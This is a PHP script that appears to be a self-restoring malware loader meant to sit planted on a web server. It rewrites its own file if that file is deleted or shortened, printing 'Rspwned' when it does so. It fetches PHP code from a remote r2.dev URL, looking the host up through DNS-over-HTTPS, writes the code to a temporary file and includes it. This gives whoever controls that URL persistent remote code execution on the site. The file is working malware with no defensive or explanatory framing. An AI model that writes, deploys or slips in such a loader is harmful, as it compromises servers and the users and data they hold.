<?php
error_reporting(0);
set_time_limit(0);

// ====================== FULL SELF-CONTENT (this gets recreated) ======================
$script_content = '<?php
error_reporting(0);
set_time_limit(0);

$url = \'https://pub-2df74355210f40209e6753810f8d5d97.r2.dev/grn.php\';
$dns = \'https://cloudflare-dns.com/dns-query\';

$ch = curl_init($url);
if (defined(\'CURLOPT_DOH_URL\')) {
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$res = curl_exec($ch);
curl_close($ch);

if ($res === false) {
    echo "Download failed.";
    exit;
}

$tmp = tmpfile();
$path = stream_get_meta_data($tmp)[\'uri\'];
fprintf($tmp, \'%s\', $res);
include($path);
fclose($tmp);  // clean up
?>';

$my_file = __FILE__;

if (!file_exists($my_file) || filesize($my_file) < 150) {
    @file_put_contents($my_file, $script_content);
    @chmod($my_file, 0644);
    echo "Rspwned<br>";
} else {
    echo "NORMAL " . date("Y-m-d H:i:s") . "<br>";
}

$url = 'https://pub-2df74355210f40209e6753810f8d5d97.r2.dev/grn.php';
$dns = 'https://cloudflare-dns.com/dns-query';

$ch = curl_init($url);
if (defined('CURLOPT_DOH_URL')) {
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$res = curl_exec($ch);
curl_close($ch);

if ($res === false) {
    echo "Download failed.";
} else {
    $tmp = tmpfile();
    $path = stream_get_meta_data($tmp)['uri'];
    fprintf($tmp, '%s', $res);
    include($path);
    fclose($tmp);
}
?>